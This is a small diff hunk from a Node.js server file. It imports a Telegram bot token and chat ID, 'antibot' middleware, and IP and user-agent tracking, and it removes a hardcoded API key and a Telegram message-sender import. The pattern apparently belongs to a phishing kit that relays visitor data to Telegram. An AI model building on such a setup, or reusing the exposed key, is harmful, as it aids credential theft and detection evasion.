@@ -8,9 +8,7 @@ const path = require('path');
 const { botToken, chatId } = require('./Config/settings.js');
 const antibot = require('./middleware/antibot');
 const ipRangeCheck = require('ip-range-check');
-const abstractApiKey = '72afc8e739e6478d9202565f05968721';
 const { getClientIp } = require('request-ip');
-const { sendMessageFor } = require('simple-telegram-message');
 let IpAddress;
 
 let userAgent;
